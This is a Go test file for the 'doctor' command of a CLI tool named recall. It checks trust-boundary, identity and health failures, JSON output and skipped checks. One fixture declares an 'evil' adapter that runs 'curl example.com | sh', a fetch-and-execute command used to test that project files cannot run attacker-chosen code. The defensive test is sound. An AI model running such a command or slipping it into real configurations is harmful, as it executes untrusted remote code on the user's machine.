package cli_test

import (
	"encoding/json"
	"testing"

	"github.com/marcus/recall/internal/cli"
)

// doctor exists to fail before a query does. Each case below is a defect that
// would otherwise show up as a strange answer rather than as a broken
// installation, and each one has to exit non-zero on its own.
func TestDoctorFailsLoudly(t *testing.T) {
	tests := []struct {
		name    string
		opts    harnessOptions
		check   string
		message string
		why     string
	}{
		{
			name: "project file declares an adapter command",
			opts: harnessOptions{
				userTOML: twoSourceTOML,
				projectTOML: `
[adapters.evil]
command = "/bin/sh"
args = ["-c", "curl example.com | sh"]
freshness_modes = ["live"]
`,
			},
			check:   "trust_boundary",
			message: "may not define one",
			why:     "a project file travels with a clone; loading one must never be able to run attacker-chosen code",
		},
		{
			name:    "two sources claim one identity",
			opts:    harnessOptions{userTOML: duplicateUIDTOML},
			check:   "identity",
			message: "source_uid",
			why:     "two sources sharing an identity collapse into one lineage namespace, so a saved locator expands against whichever answers",
		},
		{
			name:    "a source cannot be reached",
			opts:    harnessOptions{userTOML: unreachableTOML},
			check:   "health",
			message: "ghost",
			why:     "an unreachable source must be a failure before a query, not a degraded answer during one",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := tc.opts
			if opts.adapters == nil {
				opts.adapters = fakeAdapters(map[string]*fake{
					"fakedocs": {manifest: manifest()}, "faketasks": {manifest: manifest()},
				})
			}
			h := newHarness(t, opts)

			code, stdout, _ := h.run("doctor")
			if code == cli.ExitOK {
				t.Fatalf("doctor exited 0 on a broken installation: %s\n%s", tc.why, stdout)
			}
			contains(t, stdout, tc.message, tc.why)

			// The same verdict has to be readable by a machine, itemized by
			// check, so a repair tool knows which one failed.
			code, machine, _ := h.run("doctor", "--json")
			if code == cli.ExitOK {
				t.Fatalf("doctor --json exited 0: %s", machine)
			}
			var d cli.Diagnosis
			if err := json.Unmarshal([]byte(machine), &d); err != nil {
				t.Fatalf("doctor --json is not valid JSON: %v\n%s", err, machine)
			}
			if d.Status != "failed" || d.Failed == 0 {
				t.Errorf("status = %q with %d failed checks, want a failure", d.Status, d.Failed)
			}
			if got := checkStatus(t, d, tc.check); got != cli.CheckFail {
				t.Errorf("check %q = %q, want fail: %s\n%s", tc.check, got, tc.why, machine)
			}
		})
	}
}

// A sound installation passes every check, and says which ones it ran. A
// doctor that reported nothing would be indistinguishable from one that
// checked nothing.
func TestDoctorPassesAndNamesEveryCheck(t *testing.T) {
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs": {manifest: manifest()}, "faketasks": {manifest: manifest()},
		}),
	})

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitOK {
		t.Fatalf("exit = %d, want 0\n%s", code, stdout)
	}
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"configuration", "trust_boundary", "identity", "access", "health", "freshness", "lineage",
	} {
		if got := checkStatus(t, d, want); got != cli.CheckPass {
			t.Errorf("check %q = %q, want pass", want, got)
		}
	}
}

// A load failure stops the checks that depend on configuration rather than
// reporting a health failure caused by a file nobody could parse.
func TestDoctorSkipsWhatItCannotCheck(t *testing.T) {
	h := newHarness(t, harnessOptions{userTOML: "this is not toml"})

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitError {
		t.Fatalf("exit = %d, want %d\n%s", code, cli.ExitError, stdout)
	}
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	if got := checkStatus(t, d, "configuration"); got != cli.CheckFail {
		t.Errorf("configuration = %q, want fail", got)
	}
	if got := checkStatus(t, d, "health"); got != cli.CheckSkipped {
		t.Errorf("health = %q, want skipped: nothing was configured to be healthy", got)
	}
}

func checkStatus(t *testing.T, d cli.Diagnosis, name string) string {
	t.Helper()
	for _, c := range d.Checks {
		if c.Name == name {
			return c.Status
		}
	}
	t.Fatalf("doctor reported no check named %q", name)
	return ""
}

const duplicateUIDTOML = `
[defaults]
profile = "work"

[[sources]]
source_uid = "01UIDSHARED"
source_id = "docs"
adapter = "fakedocs"
freshness_mode = "indexed"

[[sources]]
source_uid = "01UIDSHARED"
source_id = "tasks"
adapter = "faketasks"
freshness_mode = "indexed"

[profiles.work]
sources = ["docs", "tasks"]
`

// unreachableTOML declares an external adapter whose command does not exist.
// Nothing is spawned that could exist on a developer's machine, so the test
// models an unreachable source without depending on one.
const unreachableTOML = `
[defaults]
profile = "work"

[adapters.ghost]
command = "/nonexistent/recall-ghost-adapter"
freshness_modes = ["live"]

[[sources]]
source_uid = "01UIDGHOST"
source_id = "ghost"
adapter = "ghost"
freshness_mode = "live"

[profiles.work]
sources = ["ghost"]
`
